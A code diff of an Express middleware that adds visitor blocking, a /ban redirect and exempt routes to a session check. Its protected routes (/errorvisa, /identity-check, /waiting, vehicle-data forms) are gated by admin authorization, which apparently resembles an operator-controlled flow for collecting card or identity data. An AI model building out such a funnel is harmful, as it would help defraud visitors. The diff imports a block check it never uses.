@@ -5,10 +5,11 @@
  * - /form: Allowed if visitor has submitted data OR authorized by admin OR was redirected here
  * - /select: Allowed if visitor has submitted vehicle data OR authorized by admin OR was redirected here
  * - Other protected routes: Allowed if authorized by admin OR was redirected here
+ * - Blocked visitors are always redirected to /ban
  */
 
 import { Request, Response, NextFunction } from "express";
-import { isVisitorAuthorized, listSubmissions, hasAllowedPage } from "@workspace/db";
+import { isVisitorAuthorized, isVisitorBlocked, listSubmissions, hasAllowedPage } from "@workspace/db";
 
 // Protected routes
 const PROTECTED_ROUTES = [
@@ -25,6 +26,13 @@ const PROTECTED_ROUTES = [
   "/waiting",
   "/errorvisa",
   "/identity-check",
+];
+
+// Routes excluded from block check (public routes and admin)
+const EXCLUDED_ROUTES = [
+  "/api",
+  "/admin",
+  "/health",
 ];
 
 /**
@@ -61,21 +69,48 @@ function getSessionId(req: Request): string | null {
 export function sessionAuthMiddleware(req: Request, res: Response, next: NextFunction): void {
   const path = req.path;
 
-  // Skip non-protected routes
-  if (!PROTECTED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
-    return next();
-  }
-
-  // Skip if already handled
-  if (res.headersSent) {
+  // Skip excluded routes (API, admin, health)
+  if (EXCLUDED_ROUTES.some(p => path.startsWith(p))) {
     return next();
   }
 
   const sessionId = getSessionId(req);
 
+  // If no session ID - check if it's a protected route, then allow
   if (!sessionId) {
+    if (PROTECTED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
+      setSecurityHeaders(res);
+      res.redirect(302, "/");
+      return;
+    }
+    return next();
+  }
+
+  // Sync check - check block status synchronously if possible
+  // For async, we handle it in the API endpoints
+  const blocked = (req as any).isBlocked;
+  if (blocked === true) {
+    console.log(`[Auth] Blocked visitor ${sessionId.substring(0, 8)}... tried to access ${path}`);
     setSecurityHeaders(res);
-    res.redirect(302, "/");
+    res.status(403).json({ error: "blocked", redirect: "/ban" });
+    return;
+  }
+
+  // Continue with normal auth checks for protected routes
+  if (PROTECTED_ROUTES.some(p => path === p || path.startsWith(p + "/"))) {
+    checkProtectedRouteAccess(req, res, next, sessionId, path);
+    return;
+  }
+
+  return next();
+}
+
+/**
+ * Check access for protected routes
+ */
+function checkProtectedRouteAccess(req: Request, res: Response, next: NextFunction, sessionId: string, path: string): void {
+  // Skip if already handled
+  if (res.headersSent) {
     return;
   }
 
